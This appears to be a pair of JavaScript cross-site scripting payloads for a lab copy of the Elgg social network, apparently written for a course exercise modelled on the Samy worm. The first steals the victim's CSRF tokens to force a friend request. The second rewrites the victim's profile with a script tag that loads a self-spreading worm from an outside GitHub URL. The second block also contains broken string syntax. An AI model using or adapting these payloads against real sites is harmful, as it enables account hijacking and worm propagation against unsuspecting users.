<script type="text/javascript">
    window.onload= function() {
        var Ajax = null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        console.log(ts);
        console.log(token);
        var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token;
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send();
}
</script>

<script type="text/javascript">
    window.onload= function() {
        var userName=elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        console.log(userName);
        console.log(guid);
        console.log(ts);
        console.log(token);
        var sendurl="http://www.xsslabelgg.com/action/profile/edit";
        var samyGuid=47;
        var content= "__elgg_token="+elgg.security.token.__elgg_token+ts+"&description="+<script type="text/javascript" src="https://raw.githubusercontent.com/kfilyk/seng360_a12_xss_worm/master/xss_worm.js"></script>"&guid="+guid; // Renames a profile to COMPROMISED

        if(elgg.session.user.guid!=samyGuid) {
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
